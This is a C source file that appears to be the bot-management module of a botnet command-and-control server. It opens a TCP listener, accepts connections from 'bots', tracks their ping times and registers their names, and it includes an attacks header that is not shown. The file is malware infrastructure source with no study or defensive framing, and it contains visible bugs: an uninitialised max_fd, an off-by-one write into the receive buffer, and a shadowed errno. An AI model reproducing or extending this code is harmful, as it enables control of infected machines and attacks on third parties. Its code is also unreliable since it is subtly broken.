#define _GNU_SOURCE // accept4()

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <time.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <arpa/inet.h>

#include "worker.h"
#include "attacks.h"

int epoll_fd_two;

static void worker_zero_bot(struct bot_info_t *bot)
{
	if (bot->fd != 0)
		close(bot->fd);

	if (bot->name_len > 0)
		memset(bot->name, 0, sizeof(bot->name));
		
	bot->fd = 0;
	bot->ping = 0;
}

static void worker_task_thread(void)
{
	while (1)
	{
		int max_fd, fds, i;

		for (i = 0; i < WORKER_MAX; i++)
		{
			if (bot_info[i].fd == 0)
				continue;

			if (bot_info[i].fd > max_fd)
				max_fd = bot_info[i].fd;
		}

		if (max_fd == 0)
		{
			sleep(1);
			continue;
		}

		struct epoll_event epoll_events[max_fd];
		fds = epoll_wait(epoll_fd_two, epoll_events, max_fd + 1, -1);

		for (i = 0; i < fds; i++)
		{
			struct bot_info_t *bot;
			int ret;

			bot = &bot_info[epoll_events[i].data.fd];

			if (epoll_events[i].events & EPOLLIN) 
			{
				char buffer[64];
				
				memset(buffer, 0, sizeof(buffer));
				if ((ret = recv(bot->fd, buffer, sizeof(buffer) - 1, MSG_NOSIGNAL)) <= 0)
				{
					worker_zero_bot(bot);
					continue;
				}

				buffer[ret + 1] = '\0';

				if (buffer[0] == '\x01')
				{
					// Ping
					bot->ping = time(NULL);
					memset(buffer, 0, sizeof(buffer));
					continue;
				}
				else if (buffer[0] == '\x02')
				{
					// Register name
					uint8_t name_len;

					memcpy(&name_len, buffer + 1, sizeof(uint8_t));
					if (name_len < 0 || name_len > 64)
					{
						memset(buffer, 0, sizeof(buffer));
						continue;
					}

					bot->name_len = name_len;
					memcpy(bot->name, buffer + 1 + sizeof(uint8_t), name_len);		
					memset(buffer, 0, sizeof(buffer));
					continue;
				}

				memset(buffer, 0, sizeof(buffer));
				continue;
			}
			else if (epoll_events[i].events & (EPOLLRDHUP | EPOLLHUP))
			{
				worker_zero_bot(bot);
				continue;
			}
		}
	}
}

static void worker_listen_thread(void)
{
	struct sockaddr_in addr;
	socklen_t addr_len;
	int socket_fd, errno;

	if ((socket_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
		printf("[worker] failed to bind to %s:%d (0)\n", WORKER_BIND, WORKER_PORT);
		pthread_exit(0);
	}

	if (setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)) < 0)
	{
		printf("[worker] failed to bind to %s:%d (1)\n", WORKER_BIND, WORKER_PORT);
		pthread_exit(0);
	}

	addr.sin_family = AF_INET;
	addr.sin_port = htons(WORKER_PORT);
	addr.sin_addr.s_addr = inet_addr(WORKER_BIND);
	addr_len = sizeof(addr);

	if (bind(socket_fd, (struct sockaddr_in *)&addr, (socklen_t)addr_len) == -1)
	{
		printf("[worker] failed to bind to %s:%d (2)\n", WORKER_BIND, WORKER_PORT);
		pthread_exit(0);
	}

	if (listen(socket_fd, 100) == -1)
	{
		printf("[worker] failed to listen on %s:%d (0)\n", WORKER_BIND, WORKER_PORT);
		pthread_exit(0);
	}

	printf("[worker] FD#%d ready to accept connections %s:%d\n", socket_fd, WORKER_BIND, WORKER_PORT);

	while (1)
	{
		int new_fd;
		struct epoll_event event;

		new_fd = accept4(socket_fd, (struct sockaddr *)&addr, &addr_len, SOCK_NONBLOCK);
		if (new_fd == -1)
		{
			if (errno == EAGAIN || errno  == EWOULDBLOCK)
				continue;

			break;
		}

		event.events = EPOLLIN | EPOLLOUT | EPOLLET;
		event.data.fd = new_fd;

		worker_zero_bot(&bot_info[new_fd]);
		bot_info[new_fd].fd = new_fd;
		bot_info[new_fd].ping = time(NULL);
		
		epoll_ctl(epoll_fd_two, EPOLL_CTL_ADD, new_fd, &event);
	}

	close(socket_fd);
	pthread_exit(0);
}

void worker_init(void)
{
	pthread_t worker_listen, worker_task;

	epoll_fd_two = epoll_create(1);

	pthread_create(&worker_listen, NULL, (void *)worker_listen_thread, NULL);
	pthread_create(&worker_task, NULL, (void *)worker_task_thread, NULL);
}